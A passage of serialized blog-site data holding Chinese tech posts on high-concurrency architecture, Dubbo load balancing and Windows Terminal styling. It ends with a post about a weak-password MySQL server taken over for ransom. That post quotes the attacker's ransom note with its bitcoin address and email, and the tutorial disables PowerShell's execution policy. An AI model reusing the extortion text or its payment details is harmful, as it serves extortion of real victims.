前言\n\n假设你在某知名电商公司干过高并发系统，用户上亿，一天流量几十亿，高峰期并发量上万，甚至是十万。那么人家一定会仔细盘问你的系统架构，你们系统啥架构？怎么部署的？部署了多少台机器？缓存咋用的？MQ咋用的？数据库咋用的？就是深挖你到底是如何抗下高并发的。\n\n因为真正干过高并发的人一定知道，脱离了业务的系统架构都是在纸上谈兵，真正在复杂业务场景而且还高并发的时候，那系统架构一定不是那么简单的，用个redis，用mq就能搞定？当然不是，真实的系统架构搭配上业务之后，会比这种简单的所谓“高并发架构”要复杂很多倍。\n\n如果有面试官问你个问题说，如何设计一个高并发系统？那么不好意思，一定是因为你实际上没干过高并发系统。面试官看你简历就没啥出彩的，感觉就不咋地，所以就会问问你，如何设计一个高并发系统？其实说白了本质就是看看你有没有自己研究过，有没有一定的知识积累。\n\n\n# 面试题剖析\n\n其实所谓的高并发，如果你要理解这个问题呢，其实就得从高并发的根源出发，为啥会有高并发？\n\n浅显一点，很简单，就是因为刚开始系统都是连接数据库的，但是要知道数据库支撑到每秒并发两三千的时候，基本就快完了。所以才有说，很多公司，刚开始干的时候，技术比较low，结果业务发展太快，有的时候系统扛不住压力就挂了。\n\n当然会挂了，凭什么不挂？你数据库如果瞬间承载每秒5000,8000，甚至上万的并发，一定会宕机，因为比如mysql就压根儿扛不住这么高的并发量。\n\n所以为啥高并发厉害？就是因为现在用互联网的人越来越多，很多app、网站、系统承载的都是高并发请求，可能高峰期每秒并发量几千，很正常的。如果是什么双十一了之类的，每秒并发几万几十万都有可能。\n\n那么如此之高的并发量，加上原本就如此之复杂的业务，咋玩儿？真正厉害的，一定是在复杂业务系统里玩儿过高并发架构的人，但是你没有，那么我给你说一下你该怎么回答这个问题：\n\n * 系统拆分，将一个系统拆分为多个子系统，用dubbo来搞。然后每个系统连一个数据库，这样本来就一个库，现在多个数据库，不也可以抗高并发么。\n * 缓存，必须得用缓存。大部分的高并发场景，都是读多写少，那你完全可以在数据库和缓存里都写一份，然后读的时候大量走缓存不就得了。毕竟人家redis轻轻松松单机几万的并发啊。没问题的。所以你可以考虑考虑你的项目里，那些承载主要请求的读场景，怎么用缓存来抗高并发。\n * MQ，必须得用MQ。可能你还是会出现高并发写的场景，比如说一个业务操作里要频繁搞数据库几十次，增删改增删改，疯了。那高并发绝对搞挂你的系统，你要是用redis来承载写那肯定不行，人家是缓存，数据随时就被LRU了，数据格式还无比简单，没有事务支持。所以该用mysql还得用mysql啊。那你咋办？用MQ吧，大量的写请求灌入MQ里，排队慢慢玩儿，后边系统消费后慢慢写，控制在mysql承载范围之内。所以你得考虑考虑你的项目里，那些承载复杂写业务逻辑的场景里，如何用MQ来异步写，提升并发性。MQ单机抗几万并发也是ok的，这个之前还特意说过。\n * 分库分表，可能到了最后数据库层面还是免不了抗高并发的要求，好吧，那么就将一个数据库拆分为多个库，多个库来抗更高的并发；然后将一个表拆分为多个表，每个表的数据量保持少一点，提高sql跑的性能。\n * 读写分离，这个就是说大部分时候数据库可能也是读多写少，没必要所有请求都集中在一个库上吧，可以搞个主从架构，主库写入，从库读取，搞一个读写分离。读流量太多的时候，还可以加更多的从库。\n * Elasticsearch，可以考虑用es。es是分布式的，可以随便扩容，分布式天然就可以支撑高并发，因为动不动就可以扩容加机器来抗更高的并发。那么一些比较简单的查询、统计类的操作，可以考虑用es来承载，还有一些全文搜索类的操作，也可以考虑用es来承载。\n\n上面的6点，基本就是高并发系统肯定要干的一些事儿，大家可以仔细结合之前讲过的知识考虑一下，到时候你可以系统的把这块阐述一下，然后每个部分要注意哪些问题，之前都讲过了，你都可以阐述阐述，表明你对这块是有点积累的。\n\n说句实话，毕竟真正你厉害的一点，不是在于弄明白一些技术，或者大概知道一个高并发系统应该长什么样？其实实际上在真正的复杂的业务系统里，做高并发要远远比我这个图复杂几十倍到上百倍。你需要考虑，哪些需要分库分表，哪些不需要分库分表，单库单表跟分库分表如何join，哪些数据要放到缓存里去啊，放哪些数据再可以抗掉高并发的请求，你需要完成对一个复杂业务系统的分析之后，然后逐步逐步的加入高并发的系统架构的改造，这个过程是务必复杂的，一旦做过一次，一旦做好了，你在这个市场上就会非常的吃香。\n\n其实大部分公司，真正看重的，不是说你掌握高并发相关的一些基本的架构知识，架构中的一些技术RocketMQ、Kafka、Redis、Elasticsearch，高并发这一块，次一等的人才。对一个有几十万行代码的复杂的分布式系统，一步一步架构、设计以及实践过高并发架构的人，这个经验是难能可贵的。",normalizedContent:"# 如何设计一个高并发系统\n\n\n# 前言\n\n假设你在某知名电商公司干过高并发系统，用户上亿，一天流量几十亿，高峰期并发量上万，甚至是十万。那么人家一定会仔细盘问你的系统架构，你们系统啥架构？怎么部署的？部署了多少台机器？缓存咋用的？mq咋用的？数据库咋用的？就是深挖你到底是如何抗下高并发的。\n\n因为真正干过高并发的人一定知道，脱离了业务的系统架构都是在纸上谈兵，真正在复杂业务场景而且还高并发的时候，那系统架构一定不是那么简单的，用个redis，用mq就能搞定？当然不是，真实的系统架构搭配上业务之后，会比这种简单的所谓“高并发架构”要复杂很多倍。\n\n如果有面试官问你个问题说，如何设计一个高并发系统？那么不好意思，一定是因为你实际上没干过高并发系统。面试官看你简历就没啥出彩的，感觉就不咋地，所以就会问问你，如何设计一个高并发系统？其实说白了本质就是看看你有没有自己研究过，有没有一定的知识积累。\n\n\n# 面试题剖析\n\n其实所谓的高并发，如果你要理解这个问题呢，其实就得从高并发的根源出发，为啥会有高并发？\n\n浅显一点，很简单，就是因为刚开始系统都是连接数据库的，但是要知道数据库支撑到每秒并发两三千的时候，基本就快完了。所以才有说，很多公司，刚开始干的时候，技术比较low，结果业务发展太快，有的时候系统扛不住压力就挂了。\n\n当然会挂了，凭什么不挂？你数据库如果瞬间承载每秒5000,8000，甚至上万的并发，一定会宕机，因为比如mysql就压根儿扛不住这么高的并发量。\n\n所以为啥高并发厉害？就是因为现在用互联网的人越来越多，很多app、网站、系统承载的都是高并发请求，可能高峰期每秒并发量几千，很正常的。如果是什么双十一了之类的，每秒并发几万几十万都有可能。\n\n那么如此之高的并发量，加上原本就如此之复杂的业务，咋玩儿？真正厉害的，一定是在复杂业务系统里玩儿过高并发架构的人，但是你没有，那么我给你说一下你该怎么回答这个问题：\n\n * 系统拆分，将一个系统拆分为多个子系统，用dubbo来搞。然后每个系统连一个数据库，这样本来就一个库，现在多个数据库，不也可以抗高并发么。\n * 缓存，必须得用缓存。大部分的高并发场景，都是读多写少，那你完全可以在数据库和缓存里都写一份，然后读的时候大量走缓存不就得了。毕竟人家redis轻轻松松单机几万的并发啊。没问题的。所以你可以考虑考虑你的项目里，那些承载主要请求的读场景，怎么用缓存来抗高并发。\n * mq，必须得用mq。可能你还是会出现高并发写的场景，比如说一个业务操作里要频繁搞数据库几十次，增删改增删改，疯了。那高并发绝对搞挂你的系统，你要是用redis来承载写那肯定不行，人家是缓存，数据随时就被lru了，数据格式还无比简单，没有事务支持。所以该用mysql还得用mysql啊。那你咋办？用mq吧，大量的写请求灌入mq里，排队慢慢玩儿，后边系统消费后慢慢写，控制在mysql承载范围之内。所以你得考虑考虑你的项目里，那些承载复杂写业务逻辑的场景里，如何用mq来异步写，提升并发性。mq单机抗几万并发也是ok的，这个之前还特意说过。\n * 分库分表，可能到了最后数据库层面还是免不了抗高并发的要求，好吧，那么就将一个数据库拆分为多个库，多个库来抗更高的并发；然后将一个表拆分为多个表，每个表的数据量保持少一点，提高sql跑的性能。\n * 读写分离，这个就是说大部分时候数据库可能也是读多写少，没必要所有请求都集中在一个库上吧，可以搞个主从架构，主库写入，从库读取，搞一个读写分离。读流量太多的时候，还可以加更多的从库。\n * elasticsearch，可以考虑用es。es是分布式的，可以随便扩容，分布式天然就可以支撑高并发，因为动不动就可以扩容加机器来抗更高的并发。那么一些比较简单的查询、统计类的操作，可以考虑用es来承载，还有一些全文搜索类的操作，也可以考虑用es来承载。\n\n上面的6点，基本就是高并发系统肯定要干的一些事儿，大家可以仔细结合之前讲过的知识考虑一下，到时候你可以系统的把这块阐述一下，然后每个部分要注意哪些问题，之前都讲过了，你都可以阐述阐述，表明你对这块是有点积累的。\n\n说句实话，毕竟真正你厉害的一点，不是在于弄明白一些技术，或者大概知道一个高并发系统应该长什么样？其实实际上在真正的复杂的业务系统里，做高并发要远远比我这个图复杂几十倍到上百倍。你需要考虑，哪些需要分库分表，哪些不需要分库分表，单库单表跟分库分表如何join，哪些数据要放到缓存里去啊，放哪些数据再可以抗掉高并发的请求，你需要完成对一个复杂业务系统的分析之后，然后逐步逐步的加入高并发的系统架构的改造，这个过程是务必复杂的，一旦做过一次，一旦做好了，你在这个市场上就会非常的吃香。\n\n其实大部分公司，真正看重的，不是说你掌握高并发相关的一些基本的架构知识，架构中的一些技术rocketmq、kafka、redis、elasticsearch，高并发这一块，次一等的人才。对一个有几十万行代码的复杂的分布式系统，一步一步架构、设计以及实践过高并发架构的人，这个经验是难能可贵的。",charsets:{cjk:!0},lastUpdated:"2022/04/26, 23:44:33",lastUpdatedTimestamp:1650987873e3},{title:"一致性hash算法",frontmatter:{title:"一致性hash算法",date:"2022-04-18T00:00:43.000Z",permalink:"/pages/0981d9/",categories:["微服务"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/12.%E5%BE%AE%E6%9C%8D%E5%8A%A1/03.%E4%B8%80%E8%87%B4%E6%80%A7hash%E7%AE%97%E6%B3%95.html",relativePath:"12.微服务/03.一致性hash算法.md",key:"v-08281882",path:"/pages/0981d9/",headersStr:null,content:"https://www.bilibili.com/video/av25184175",normalizedContent:"https://www.bilibili.com/video/av25184175",charsets:{},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"dubbo负载均衡策略",frontmatter:{title:"dubbo负载均衡策略",date:"2022-04-18T00:00:43.000Z",permalink:"/pages/ff6bd1/",categories:["微服务"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/12.%E5%BE%AE%E6%9C%8D%E5%8A%A1/04.dubbo%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AD%96%E7%95%A5.html",relativePath:"12.微服务/04.dubbo负载均衡策略.md",key:"v-b945b45c",path:"/pages/ff6bd1/",headers:[{level:2,title:"random loadbalance",slug:"random-loadbalance",normalizedTitle:"random loadbalance",charIndex:2},{level:2,title:"roundrobin loadbalance",slug:"roundrobin-loadbalance",normalizedTitle:"roundrobin loadbalance",charIndex:128},{level:2,title:"leastactive loadbalance",slug:"leastactive-loadbalance",normalizedTitle:"leastactive loadbalance",charIndex:267},{level:2,title:"consistanthash loadbalance",slug:"consistanthash-loadbalance",normalizedTitle:"consistanthash loadbalance",charIndex:354}],headersStr:"random loadbalance roundrobin loadbalance leastactive loadbalance consistanthash loadbalance",content:"# random loadbalance\n\n默认情况下，dubbo是random load balance随机调用实现负载均衡，可以对provider不同实例设置不同的权重，会按照权重来负载均衡，权重越大分配流量越高，一般就用这个默认的就可以了。\n\n\n# roundrobin loadbalance\n\n还有roundrobin loadbalance，这个的话默认就是均匀地将流量打到各个机器上去，但是如果各个机器的性能不一样，容易导致性能差的机器负载过高。所以此时需要调整权重，让性能差的机器承载权重小一些，流量少一些。\n\n\n# leastactive loadbalance\n\n这个就是自动感知一下，如果某个机器性能越差，那么接收的请求越少，越不活跃，此时就会给不活跃的性能差的机器更少的请求\n\n\n# consistanthash loadbalance\n\n一致性Hash算法，相同参数的请求一定分发到一个provider上去，provider挂掉的时候，会基于虚拟节点均匀分配剩余的流量，抖动不会太大。如果你需要的不是随机负载均衡，是要一类请求都到一个节点，那就走这个一致性hash策略。",normalizedContent:"# random loadbalance\n\n默认情况下，dubbo是random load balance随机调用实现负载均衡，可以对provider不同实例设置不同的权重，会按照权重来负载均衡，权重越大分配流量越高，一般就用这个默认的就可以了。\n\n\n# roundrobin loadbalance\n\n还有roundrobin loadbalance，这个的话默认就是均匀地将流量打到各个机器上去，但是如果各个机器的性能不一样，容易导致性能差的机器负载过高。所以此时需要调整权重，让性能差的机器承载权重小一些，流量少一些。\n\n\n# leastactive loadbalance\n\n这个就是自动感知一下，如果某个机器性能越差，那么接收的请求越少，越不活跃，此时就会给不活跃的性能差的机器更少的请求\n\n\n# consistanthash loadbalance\n\n一致性hash算法，相同参数的请求一定分发到一个provider上去，provider挂掉的时候，会基于虚拟节点均匀分配剩余的流量，抖动不会太大。如果你需要的不是随机负载均衡，是要一类请求都到一个节点，那就走这个一致性hash策略。",charsets:{cjk:!0},lastUpdated:"2022/04/26, 23:44:33",lastUpdatedTimestamp:1650987873e3},{title:"微服务",frontmatter:{pageComponent:{name:"Catalogue",data:{path:"12.微服务",imgUrl:"/img/catalog.png",description:"微服务"}},title:"微服务",date:"2022-04-17T21:48:12.000Z",permalink:"/microservice/",sidebar:!0,article:!1,comment:!1,editLink:!1,author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/12.%E5%BE%AE%E6%9C%8D%E5%8A%A1/catalog.html",relativePath:"12.微服务/catalog.md",key:"v-5598df1b",path:"/microservice/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/26, 23:15:39",lastUpdatedTimestamp:1650986139e3},{title:"归档",frontmatter:{archivesPage:!0,title:"归档",permalink:"/archives/",article:!1},regularPath:"/@pages/archivesPage.html",relativePath:"@pages/archivesPage.md",key:"v-52a39b45",path:"/archives/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/17, 18:06:37",lastUpdatedTimestamp:1650189997e3},{title:"分类",frontmatter:{categoriesPage:!0,title:"分类",permalink:"/categories/",article:!1},regularPath:"/@pages/categoriesPage.html",relativePath:"@pages/categoriesPage.md",key:"v-41a9b6a5",path:"/categories/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/17, 18:06:37",lastUpdatedTimestamp:1650189997e3},{title:"标签",frontmatter:{tagsPage:!0,title:"标签",permalink:"/tags/",article:!1},regularPath:"/@pages/tagsPage.html",relativePath:"@pages/tagsPage.md",key:"v-d0167e76",path:"/tags/",headersStr:null,content:"",normalizedContent:"",charsets:{},lastUpdated:"2022/04/17, 18:06:37",lastUpdatedTimestamp:1650189997e3},{title:"Windows Terminal美化（oh-my-posh3）",frontmatter:{title:"Windows Terminal美化（oh-my-posh3）",date:"2022-04-17T23:58:24.000Z",permalink:"/pages/2e2879/",sidebar:"auto",categories:["随笔"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/_posts/%E5%85%B6%E4%BB%96/Windows%20Terminal%E7%BE%8E%E5%8C%96%EF%BC%88oh-my-posh3%EF%BC%89.html",relativePath:"_posts/其他/Windows Terminal美化（oh-my-posh3）.md",key:"v-485a7d47",path:"/pages/2e2879/",headers:[{level:2,title:"一.安装主题",slug:"一-安装主题",normalizedTitle:"一.安装主题",charIndex:233},{level:2,title:"二.编辑相应配置文件",slug:"二-编辑相应配置文件",normalizedTitle:"二.编辑相应配置文件",charIndex:715},{level:2,title:"三.安装Nerd Fonts字体并应用",slug:"三-安装nerd-fonts字体并应用",normalizedTitle:"三.安装nerd fonts字体并应用",charIndex:1629},{level:2,title:"四.在vscode中power shell样式（可选）",slug:"四-在vscode中power-shell样式-可选",normalizedTitle:"四.在vscode中power shell样式（可选）",charIndex:2531},{level:2,title:"小结",slug:"小结",normalizedTitle:"小结",charIndex:2802},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:2331}],headersStr:"一.安装主题 二.编辑相应配置文件 三.安装Nerd Fonts字体并应用 四.在vscode中power shell样式（可选） 小结 参考",content:'前一段时间想美化一下Windows Terminal，无奈网上教程比较乱，美化中途也遇到了许多问题，于是，便想写一篇文章关于怎么美化Windows Terminal。\n\n网上看到的教程大多数是关于oh-my-posh2的，现在oh-my-posh升级到3了，一些地方有些小的变化。关于oh-my-posh2的教程，oh-my-posh的作者在GitHub已经讲的很清楚了。\n\n----------------------------------------\n\n\n# 一.安装主题\n\n1.首先，先贴上oh-my-posh的官方文档：\n\n2.然后，想必各位都已经事先安装好了Windows Terminal，没安装好的到Microsoft store搜索“Windows Terminal”安装即可。\n\n**3.**安装好之后，使用管理员身份打开Windows Terminal。安装oh-my-posh和posh-git。\n\n * 第一条命令（绕过power shell执行策略，使其可以执行脚本文件<后面会用到>）\n\nSet-ExecutionPolicy Bypass\n\n\n1\n\n * 第二条命令（oh-my-posh提供主题）\n\nInstall-Module oh-my-posh -Scope CurrentUser\n\n\n1\n\n * 第三条命令（posh-git将git信息添加到提示中）\n\nInstall-Module posh-git -Scope CurrentUser\n\n\n1\n\n\n> 注意：如果中途有询问，直接Y就好了。\n\n----------------------------------------\n\n\n# 二.编辑相应配置文件\n\n1.在Windows Terminal中敲下下面两行命令\n\n * 第一条（启动编辑power shell配置文件的引擎）\n\nif (!(Test-Path -Path $PROFILE )) { New-Item -Type File -Path $PROFILE -Force }\n\n\n1\n\n * 第二条（使用记事本打开配置文件）\n\n2.在打开的记事本中写入如下内容（脚本文件），并保存\n\nImport-Module posh-git\nImport-Module oh-my-posh\nSet-PoshPrompt -Theme JanDeDobbeleer\n\n\n1\n2\n3\n\n * 第一条命令表示导入posh-git\n * 第二条命令表示导入oh-my-posh\n * 第三条命令表示设置主题为JanDeDobbeleer\n\n配置完后，每次打开Windows Terminal中的Power shell都会执行脚本文件中的三条命令。\n\n #注意：此处的第三行是oh-my-posh2与3的不同之一，在oh-my-posh2里的是：\n                                        Set-Theme XXXX\n            #如果不是很喜欢这个主题，可以使用以下命令来查看所有主题以及主题的名称.omp\n                                        Get-PoshThemes\n            #找到喜欢的主题后，可以在之前的脚本文件中将主题名称替换为你想要主题的名称。\n                            #注意：此处获取主题在oh-my-posh2的命令为：\n                                          Get-Theme\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> 这时，你会发现出现了一些方框，效果并不像图片上那么好。那是因为，还没有给主题安装适应的字体。\n\n----------------------------------------\n\n\n# 三.安装Nerd Fonts字体并应用\n\n1.安装字体\n\n * 进入上面的网站\n * 点击***Downloads***\n * 随便下载一款字体（但个人推荐<DejaVuSansMono Nerd Font>或<Cousine Nerd Font>，这两套字体比较全，适配也还不错。）\n * 下载完成后，解压到当前文件夹，然后CTRL+A全选，右键点击安装，等待安装完成即可。\n\n2.使用字体\n\n * 打开power shell，并在上方标签栏点击下拉按钮找到设置，并点击，然后在左侧最下方点击打开JSON文件。\n * 如果有vscode，将会在vscode中打开settings.json，这个就是Windows Terminal的配置文件。\n * 这个配置文件最开始几行表示的是架构和默认配置。下面几行有3个包含着字典的列表，分别表示快捷键（keybindings）、配置（profiles）、配色方案（schemes）。而我们需要设置的地方在配置（profiles）中，在profiles中，我们能看到有多个字典，我们需要设置美化power shell，故找到字典中包含：\n\n"guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}"\n\n\n1\n\n\n这是power shell的全局唯一标识符（guid）。\n\n * 找到后，将其中键为"fontFace"的键值对改为（如果没有fontFace就自己添加一下，放在guid下一行，记得加逗号）：\n\n"fontFace": "DejaVuSansMono Nerd Font"\n\n\n1\n\n\n> 注意：此处字体的名称请参考上方Nerd Fonts网站中的字体名称，否则无法显示出来。\n\n * 设置好之后保存settings.json文件（若vscode未开启自动保存设置，可使用CTRL+S进行保存。）\n * 完成之后重启Windows Terminal即可发现样式改变了，若未改变，请重启Windows Terminal。\n\n----------------------------------------\n\n\n# 四.在vscode中power shell样式（可选）\n\n1.使用 CTRL+， 是的，你没有看错CTRL+逗号打开vscode的设置\n\n2.在顶部输入框输入以下字符：\n\n3.在所显示（Terminal › Integrated:Font Family）的输入框中输入（在我的电脑上Cousine Nerd Font适配比较好，不会出现偏移的现象）：\n\n或\n\n4.使用 CTRL+` 召唤终端，即可看到样式发生改变，如果看不到，请重启vscode。\n\n----------------------------------------\n\n\n# 小结\n\nWindows Terminal的美化到此结束，一顿操作下来，是不是比以前好看了不少？结束前还讲了下vscode的美化方法，让编写程序的时候能够获得额外的审美体验，岂不美哉？\n\n----------------------------------------\n\n\n# 参考\n\n 1. ^对GitHub上的oh-my-posh2安装做了一些修改 https://github.com/JanDeDobbeleer/oh-my-posh2#installation\n 2. ^oh-my-posh2升级到3过程中所发生的变化 https://ohmyposh.dev/docs/upgrading\n 3. ^在oh-my-posh2上，需要安装powerline字体。而在on-my-posh3上，有一些符号已经不支持了，所以需要安装Nerd Fonts字体（字符图标样式号称最全）。',normalizedContent:'前一段时间想美化一下windows terminal，无奈网上教程比较乱，美化中途也遇到了许多问题，于是，便想写一篇文章关于怎么美化windows terminal。\n\n网上看到的教程大多数是关于oh-my-posh2的，现在oh-my-posh升级到3了，一些地方有些小的变化。关于oh-my-posh2的教程，oh-my-posh的作者在github已经讲的很清楚了。\n\n----------------------------------------\n\n\n# 一.安装主题\n\n1.首先，先贴上oh-my-posh的官方文档：\n\n2.然后，想必各位都已经事先安装好了windows terminal，没安装好的到microsoft store搜索“windows terminal”安装即可。\n\n**3.**安装好之后，使用管理员身份打开windows terminal。安装oh-my-posh和posh-git。\n\n * 第一条命令（绕过power shell执行策略，使其可以执行脚本文件<后面会用到>）\n\nset-executionpolicy bypass\n\n\n1\n\n * 第二条命令（oh-my-posh提供主题）\n\ninstall-module oh-my-posh -scope currentuser\n\n\n1\n\n * 第三条命令（posh-git将git信息添加到提示中）\n\ninstall-module posh-git -scope currentuser\n\n\n1\n\n\n> 注意：如果中途有询问，直接y就好了。\n\n----------------------------------------\n\n\n# 二.编辑相应配置文件\n\n1.在windows terminal中敲下下面两行命令\n\n * 第一条（启动编辑power shell配置文件的引擎）\n\nif (!(test-path -path $profile )) { new-item -type file -path $profile -force }\n\n\n1\n\n * 第二条（使用记事本打开配置文件）\n\n2.在打开的记事本中写入如下内容（脚本文件），并保存\n\nimport-module posh-git\nimport-module oh-my-posh\nset-poshprompt -theme jandedobbeleer\n\n\n1\n2\n3\n\n * 第一条命令表示导入posh-git\n * 第二条命令表示导入oh-my-posh\n * 第三条命令表示设置主题为jandedobbeleer\n\n配置完后，每次打开windows terminal中的power shell都会执行脚本文件中的三条命令。\n\n #注意：此处的第三行是oh-my-posh2与3的不同之一，在oh-my-posh2里的是：\n                                        set-theme xxxx\n            #如果不是很喜欢这个主题，可以使用以下命令来查看所有主题以及主题的名称.omp\n                                        get-poshthemes\n            #找到喜欢的主题后，可以在之前的脚本文件中将主题名称替换为你想要主题的名称。\n                            #注意：此处获取主题在oh-my-posh2的命令为：\n                                          get-theme\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> 这时，你会发现出现了一些方框，效果并不像图片上那么好。那是因为，还没有给主题安装适应的字体。\n\n----------------------------------------\n\n\n# 三.安装nerd fonts字体并应用\n\n1.安装字体\n\n * 进入上面的网站\n * 点击***downloads***\n * 随便下载一款字体（但个人推荐<dejavusansmono nerd font>或<cousine nerd font>，这两套字体比较全，适配也还不错。）\n * 下载完成后，解压到当前文件夹，然后ctrl+a全选，右键点击安装，等待安装完成即可。\n\n2.使用字体\n\n * 打开power shell，并在上方标签栏点击下拉按钮找到设置，并点击，然后在左侧最下方点击打开json文件。\n * 如果有vscode，将会在vscode中打开settings.json，这个就是windows terminal的配置文件。\n * 这个配置文件最开始几行表示的是架构和默认配置。下面几行有3个包含着字典的列表，分别表示快捷键（keybindings）、配置（profiles）、配色方案（schemes）。而我们需要设置的地方在配置（profiles）中，在profiles中，我们能看到有多个字典，我们需要设置美化power shell，故找到字典中包含：\n\n"guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}"\n\n\n1\n\n\n这是power shell的全局唯一标识符（guid）。\n\n * 找到后，将其中键为"fontface"的键值对改为（如果没有fontface就自己添加一下，放在guid下一行，记得加逗号）：\n\n"fontface": "dejavusansmono nerd font"\n\n\n1\n\n\n> 注意：此处字体的名称请参考上方nerd fonts网站中的字体名称，否则无法显示出来。\n\n * 设置好之后保存settings.json文件（若vscode未开启自动保存设置，可使用ctrl+s进行保存。）\n * 完成之后重启windows terminal即可发现样式改变了，若未改变，请重启windows terminal。\n\n----------------------------------------\n\n\n# 四.在vscode中power shell样式（可选）\n\n1.使用 ctrl+， 是的，你没有看错ctrl+逗号打开vscode的设置\n\n2.在顶部输入框输入以下字符：\n\n3.在所显示（terminal › integrated:font family）的输入框中输入（在我的电脑上cousine nerd font适配比较好，不会出现偏移的现象）：\n\n或\n\n4.使用 ctrl+` 召唤终端，即可看到样式发生改变，如果看不到，请重启vscode。\n\n----------------------------------------\n\n\n# 小结\n\nwindows terminal的美化到此结束，一顿操作下来，是不是比以前好看了不少？结束前还讲了下vscode的美化方法，让编写程序的时候能够获得额外的审美体验，岂不美哉？\n\n----------------------------------------\n\n\n# 参考\n\n 1. ^对github上的oh-my-posh2安装做了一些修改 https://github.com/jandedobbeleer/oh-my-posh2#installation\n 2. ^oh-my-posh2升级到3过程中所发生的变化 https://ohmyposh.dev/docs/upgrading\n 3. ^在oh-my-posh2上，需要安装powerline字体。而在on-my-posh3上，有一些符号已经不支持了，所以需要安装nerd fonts字体（字符图标样式号称最全）。',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"电子书下载",frontmatter:{title:"电子书下载",date:"2022-04-17T23:58:24.000Z",permalink:"/pages/6dd8cf/",sidebar:"auto",categories:["随笔"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/_posts/%E5%85%B6%E4%BB%96/%E7%94%B5%E5%AD%90%E4%B9%A6%E4%B8%8B%E8%BD%BD.html",relativePath:"_posts/其他/电子书下载.md",key:"v-36419016",path:"/pages/6dd8cf/",headersStr:null,content:" 1. z library 经常会被封 导致换ip 但是资源很全",normalizedContent:" 1. z library 经常会被封 导致换ip 但是资源很全",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"关于弱密码的反思2022-05-29",frontmatter:{title:"关于弱密码的反思2022-05-29",date:"2022-08-10T15:50:10.000Z",permalink:"/pages/cd2372/",sidebar:"auto",categories:["随笔"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/_posts/%E9%9A%8F%E7%AC%94/%E5%85%B3%E4%BA%8E%E5%BC%B1%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%8D%E6%80%9D2022-05-29.html",relativePath:"_posts/随笔/关于弱密码的反思2022-05-29.md",key:"v-27a24cd8",path:"/pages/cd2372/",headers:[{level:2,title:"事情起因",slug:"事情起因",normalizedTitle:"事情起因",charIndex:2},{level:2,title:"反思",slug:"反思",normalizedTitle:"反思",charIndex:506}],headersStr:"事情起因 反思",content:"# 事情起因\n\n今天突然连不上服务器上 学习用的那个数据库了\n\n虽说没有什么重要数据 但是有些代码是上面存的一些数据来跑的\n\n一直显示密码错误\n\n我又没改过密码 以前都是这个配置就行\n\n后来发现我重置了密码，本地能访问mysql了，远程还是连不上\n\n我以为是容器的问题，我删掉了容器，重启映射了数据卷起了一个新的服务\n\n结果还是连不上\n\n我突然想起来可能是用户权限的问题\n\nroot权限不能远程访问\n\n但是没道理哇？之前都行的，因为之前配置过的，于是我又配置了远程访问数据库\n\n这下可以了吧\n\n确实连上了\n\n可是点进去一看不对了\n\n一堆叫README的数据表和数据库\n\n其中有一列是\n\n以下数据库已被删除：xxx。 我们有完整的备份。 要恢复它，您必须向我们的比特币地址bc1qrznpsa2x6fyqkhfyvalfddzznlan22l2s4r28x支付0.01比特币（BTC）。 如果您需要证明，请通过以下电子邮件与我们联系。 chao71@protonmail.com 。 任何与付款无关的邮件都将被忽略！\n\n\n1\n\n\n里面意思是要我付钱给他比特币恢复数据\n\n去你妈的，这能给你钱？真的是想屁吃\n\n\n# 反思\n\n幸亏这次没什么重要数据，一方面丢了无所谓 也不是什么隐私数据，为数不多的几个用户密码，撞库都撞不出来，但是如果下次是重要数据怎么办呢？\n\n那肯定损失巨大，所以得从根源上解决问题！\n\n这次至少最大的问题在于我的数据库密码设置的是弱密码\n\n之前一直觉得无所谓，而且以前本地的数据库密码也喜欢设置成弱密码\n\n所以以后在设置密码的时候得避免弱密码的问题\n\n不仅仅是数据库，我突然一下都不敢用用户名密码登录服务器了，下次服务器又被攻击了可不好了，赶紧去配置了密钥",normalizedContent:"# 事情起因\n\n今天突然连不上服务器上 学习用的那个数据库了\n\n虽说没有什么重要数据 但是有些代码是上面存的一些数据来跑的\n\n一直显示密码错误\n\n我又没改过密码 以前都是这个配置就行\n\n后来发现我重置了密码，本地能访问mysql了，远程还是连不上\n\n我以为是容器的问题，我删掉了容器，重启映射了数据卷起了一个新的服务\n\n结果还是连不上\n\n我突然想起来可能是用户权限的问题\n\nroot权限不能远程访问\n\n但是没道理哇？之前都行的，因为之前配置过的，于是我又配置了远程访问数据库\n\n这下可以了吧\n\n确实连上了\n\n可是点进去一看不对了\n\n一堆叫readme的数据表和数据库\n\n其中有一列是\n\n以下数据库已被删除：xxx。 我们有完整的备份。 要恢复它，您必须向我们的比特币地址bc1qrznpsa2x6fyqkhfyvalfddzznlan22l2s4r28x支付0.01比特币（btc）。 如果您需要证明，请通过以下电子邮件与我们联系。 chao71@protonmail.com 。 任何与付款无关的邮件都将被忽略！\n\n\n1\n\n\n里面意思是要我付钱给他比特币恢复数据\n\n去你妈的，这能给你钱？真的是想屁吃\n\n\n# 反思\n\n幸亏这次没什么重要数据，一方面丢了无所谓 